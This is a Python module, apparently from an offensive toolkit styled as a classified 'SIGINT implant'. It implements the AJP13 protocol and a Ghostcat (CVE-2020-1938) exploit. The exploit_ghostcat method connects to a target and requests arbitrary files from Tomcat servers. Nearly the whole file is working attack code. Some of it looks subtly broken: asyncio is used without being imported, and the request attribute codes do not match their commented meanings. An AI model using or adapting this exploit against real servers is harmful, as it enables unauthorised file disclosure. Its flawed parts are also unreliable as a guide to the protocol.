#
# 🛡️ C4ISR-STRATCOM-IMPLANT-SIGINT-V5: AJP13 Protocol Engine
# [CLASSIFIED]: CONFIDENCIAL
# [MODULE]: AJP13Codec
#

import socket
import logging

logger = logging.getLogger("SIGINT_V5")

class AJP13Codec:
    """
    Manual AJP13 implementation for raw protocol control.
    Enables precise fingerprinting and Ghostcat (CVE-2020-1938) exploitation.
    """
    PREFIX_CLIENT = 0x1234
    PREFIX_SERVER = 0x4142

    MSG_FORWARD_REQ = 0x02
    MSG_SEND_BODY   = 0x03
    MSG_END_RESP    = 0x05
    MSG_GET_BODY    = 0x06

    HTTP_METHODS = {
        'GET': 2, 'HEAD': 3, 'POST': 4, 'PUT': 5, 'DELETE': 6, 'OPTIONS': 1
    }

    def _encode_string(self, s):
        if s is None:
            return b'\xff\xff'
        encoded = s.encode('utf-8')
        return len(encoded).to_bytes(2, 'big') + encoded + b'\x00'

    def build_forward_request(self, method='GET', uri='/', remote_addr='127.0.0.1', 
                               remote_host='localhost', server_name='localhost', 
                               port=80, is_ssl=False, headers=None, attributes=None):
        """Builds a Forward Request AJP13 packet."""
        payload = bytearray()
        payload.append(self.MSG_FORWARD_REQ)
        payload.append(self.HTTP_METHODS.get(method.upper(), 2))
        payload.extend(self._encode_string('HTTP/1.1'))
        payload.extend(self._encode_string(uri))
        payload.extend(self._encode_string(remote_addr))
        payload.extend(self._encode_string(remote_host))
        payload.extend(self._encode_string(server_name))
        payload.extend(port.to_bytes(2, 'big'))
        payload.append(0x01 if is_ssl else 0x00)

        headers = headers or []
        payload.extend(len(headers).to_bytes(2, 'big'))
        for h_name, h_value in headers:
            payload.extend(self._encode_string(h_name))
            payload.extend(self._encode_string(h_value))

        attributes = attributes or []
        for attr_code, attr_value in attributes:
            payload.append(attr_code)
            payload.extend(self._encode_string(attr_value))
        payload.append(0xFF) # Terminator

        packet = self.PREFIX_CLIENT.to_bytes(2, 'big') + len(payload).to_bytes(2, 'big') + payload
        return bytes(packet)

    def build_ghostcat_request(self, file_path):
        """Specific attributes to trigger Ghostcat file read."""
        attributes = [
            (0x01, file_path), # javax.servlet.include.servlet_path
            (0x02, ''),        # javax.servlet.include.path_info
            (0x03, '/'),       # javax.servlet.include.request_uri
        ]
        return self.build_forward_request(method='GET', uri='/index.jsp', attributes=attributes)

    def parse_response(self, data):
        """Parses server chunks into a response body."""
        offset = 0
        body = bytearray()
        while offset < len(data):
            if data[offset:offset+2] != self.PREFIX_SERVER.to_bytes(2, 'big'):
                break
            
            msg_type = data[offset + 2]
            msg_len = int.from_bytes(data[offset + 3:offset + 5], 'big')
            msg_data = data[offset + 5 : offset + 5 + msg_len]
            
            if msg_type == self.MSG_SEND_BODY:
                chunk_len = int.from_bytes(msg_data[0:2], 'big')
                body.extend(msg_data[2:2+chunk_len])
            elif msg_type == self.MSG_END_RESP:
                break
            
            offset += 5 + msg_len
        return bytes(body)

    async def exploit_ghostcat(self, host, port, file_path):
        """High-level Ghostcat exploitation."""
        packet = self.build_ghostcat_request(file_path)
        try:
            reader, writer = await asyncio.open_connection(host, port)
            writer.write(packet)
            await writer.drain()
            
            response = b''
            while True:
                chunk = await reader.read(65536)
                if not chunk: break
                response += chunk
                # Optimized check for End Response packet
                if self.MSG_END_RESP.to_bytes(1, 'big') in chunk:
                    break
            
            writer.close()
            await writer.wait_closed()
            return self.parse_response(response)
        except Exception as e:
            logger.error(f"Ghostcat failed on {host}:{port}: {e}")
            return None
